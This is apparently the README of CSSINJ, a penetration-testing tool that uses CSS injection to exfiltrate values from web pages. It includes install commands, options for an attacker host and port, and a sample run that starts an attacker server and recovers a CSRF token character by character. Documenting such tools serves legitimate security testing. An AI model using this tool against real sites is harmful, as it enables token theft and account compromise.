---

# CSSINJ  

```
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|
```

## About  

**CSSINJ** is a penetration testing tool that exploits **CSS injection vulnerabilities** to exfiltrate sensitive information from web applications. This tool is designed for security professionals to assess the security posture of web applications by demonstrating how CSS can be used to extract data covertly.  


## Installation  

To install and set up **CSSINJ**, run the following commands:  

```bash
git clone https://github.com/DonAsako/CSSinj.git
cd CSSinj
python3 -m venv venv  
source venv/bin/activate
python3 -m pip install -r requirements.txt
```

Now you’re ready to use **CSSINJ**! 🎯  

## Usage  

```bash
python3 CSSINJ.py [-h] -H HOSTNAME -p PORT -i IDENTIFIER
```

### Options  

| Option                 | Description                                 |
|------------------------|---------------------------------------------|
| `-h, --help`           | Show help message and exit                  |
| `-H, --hostname`       | Attacker hostname or IP address             |
| `-p, --port`           | Port number of the attacker                 |
| `-i, --identifier`     | CSS identifier (CSS selector) to extract data |

### Example  

```bash
~ python3 CSSINJ.py -H 127.0.0.1 -p 5005 -i input.csrf
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|

[✓] Attacker's server started on 127.0.0.1:5005
======== Running on http://0.0.0.0:5005 ========
(Press CTRL+C to quit)
[✓] Connection from ::1
[ⓘ] Token is M
[ⓘ] Token is My
[ⓘ] Token is MyC
[ⓘ] Token is MyCS
[ⓘ] Token is MyCSS
[ⓘ] Token is MyCSSR
[ⓘ] Token is MyCSSRF
[ⓘ] Token is MyCSSRFT
[ⓘ] Token is MyCSSRFTO
[ⓘ] Token is MyCSSRFTOK
[ⓘ] Token is MyCSSRFTOKE
[ⓘ] Token is MyCSSRFTOKEN
[✓] The token is : MyCSSRFTOKEN
```

## Disclaimer  

This tool is intended **only for ethical hacking and security research**. **Unauthorized use on systems without explicit permission is illegal**. The developer **is not responsible** for any misuse of this tool.  

## Author  

**CSSINJ** was developed by **Asako**.  
